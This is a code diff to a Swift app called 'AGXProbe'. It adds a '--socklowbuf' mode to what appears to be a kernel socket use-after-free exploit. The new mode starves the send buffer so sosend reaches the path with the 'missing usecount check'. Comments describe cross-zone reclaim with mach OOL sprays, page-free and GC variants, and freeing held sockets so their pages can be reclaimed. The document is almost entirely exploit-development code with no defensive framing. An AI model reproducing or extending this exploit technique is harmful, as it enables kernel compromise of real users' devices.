@@ -142,7 +142,8 @@ final class ReachViewModel: ObservableObject {
         if args.contains("--sockool") || args.contains("--sockxz") || args.contains("--sockgc")
             || args.contains("--sockudp") || args.contains("--sockprec")
             || args.contains("--sockmix")
-            || args.contains("--zoneprobe") { Task.detached { await self.runSocketUafMode() }; return }
+            || args.contains("--zoneprobe")
+            || args.contains("--socklowbuf") { Task.detached { await self.runSocketUafMode() }; return }
         if args.contains("--autorun") { emit("AGXProbe v123 ready (use --webscan)") }
     }
 
@@ -720,6 +721,13 @@ func runFuzzMode() async {
                                           _ sprayCount: Int, _ precPort: Int,
                                           _ peers: inout [Int32], _ peerLock: NSLock) -> Bool {
         let n = 6
+        // Optional: starve the send buffer so sosend takes the sblock/sbwait paths
+        // where the missing usecount check actually lives.
+        if ProcessInfo.processInfo.arguments.contains("--socklowbuf") {
+            var small: Int32 = 512
+            setsockopt(target, SOL_SOCKET, SO_SNDBUF, &small,
+                       socklen_t(MemoryLayout<Int32>.size))
+        }
         st.fd = target
         st.done = 0
         st.entered = 0
@@ -1209,8 +1217,9 @@ func runFuzzMode() async {
         let udpOnly = ProcessInfo.processInfo.arguments.contains("--sockudp")
         let precOnly = ProcessInfo.processInfo.arguments.contains("--sockprec")
         let mixOnly = ProcessInfo.processInfo.arguments.contains("--sockmix")
+        let lowBufOnly = ProcessInfo.processInfo.arguments.contains("--socklowbuf")
         if ProcessInfo.processInfo.arguments.contains("--zoneprobe") { sockUafZoneProbe(); return }
-        let solo = oolOnly || xzOnly || gcOnly || udpOnly || precOnly || mixOnly
+        let solo = oolOnly || xzOnly || gcOnly || udpOnly || precOnly || mixOnly || lowBufOnly
         var hits = 0
         let t0 = Date()
         var maxAfterClose: Int32 = 0
@@ -1242,7 +1251,7 @@ func runFuzzMode() async {
             // NB: r==5 is the cross-zone reclaim (mach OOL), r==6 is the page-free
             // block, r==7 is batch GC. The solo flags used to be swapped here, so
             // --sockool ran the page-free variant and vice versa.
-            let r = oolOnly ? 5 : (xzOnly ? 6 : (gcOnly ? 7 : (udpOnly ? 8 : ((precOnly || mixOnly) ? 4 : it % 5))))
+            let r = oolOnly ? 5 : (xzOnly ? 6 : (gcOnly ? 7 : (udpOnly ? 8 : ((precOnly || mixOnly || lowBufOnly) ? 4 : it % 5))))
             // Return a batch of held sockets so their pages go back to the page
             // allocator, giving the OOL spray fresh memory to occupy.
             if solo && !exhaustFds.isEmpty && it % 2 == 0 {
